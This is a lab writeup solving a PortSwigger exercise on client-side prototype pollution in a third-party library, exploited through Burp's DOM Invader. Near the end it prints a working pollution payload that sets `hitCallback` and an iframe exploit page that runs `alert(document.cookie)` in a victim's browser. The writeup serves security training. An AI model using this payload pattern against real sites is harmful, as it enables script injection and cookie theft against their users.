# Client-side prototype pollution in third-party libraries

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries), you'll learn: Client-side prototype pollution in third-party libraries! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) via client-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution). This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution) as this will save you a considerable amount of time and effort.

To solve the lab:

1. Use DOM Invader to identify a prototype pollution and a gadget for DOM [XSS](https://portswigger.net/web-security/cross-site-scripting). 
2. Use the provided exploit server to deliver a payload to the victim that calls `alert(document.cookie)` in their browser.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Widespread prototype pollution gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets) by [Gareth Heyes](https://portswigger.net/research/gareth-heyes).

## Exploitation

### Use DOM Invader to identify a prototype pollution and a gadget for DOM [XSS](https://portswigger.net/web-security/cross-site-scripting)

**Enable DOM Invader:**

In Burp Suite Browser, you can use the Burp Suite extension:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118202226.png)

Then turn on DOM Invader:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118202425.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118202454.png)

After that, turn on prototype pollution in attack types:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118202612.png)

Finally, open Devtool and go to DOM Invader tab:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118202701.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118202718.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118202724.png)

We can see that there are 2 sources. One is using `__proto__[property]`, another one is using `constructor`.

Let's click "Test" on the first source:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118202851.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118202907.png)

Then, go to "Console" tab in Devtool, and verify the global `Object.prototype`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118202957.png)

It worked!

Now, we can click the "Scan for gadgets" button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118203026.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118203043.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118203120.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118203149.png)

In here, the DOM Invader found 1 sink called `setTimeout(1)`.

Let's click the "Exploit" button!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118203302.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118203315.png)

It worked!

**Payload:**
```js
/#__proto__[hitCallback]=alert(1)
```

**Finally, we can craft a HTML payload that trigger the DOM-based XSS payload!**
```html
<html>
    <head>
        <title>Client-side prototype pollution in third-party libraries</title>
    </head>
    <body>
        <iframe src="https://0aca001a03c2b291c133bcd300da0067.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)"></iframe>
    </body>
</html>
```

**Then host it on the exploit server and deliver it to victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118203704.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-3/images/Pasted%20image%2020230118203712.png)

# What we've learned:

1. Client-side prototype pollution in third-party libraries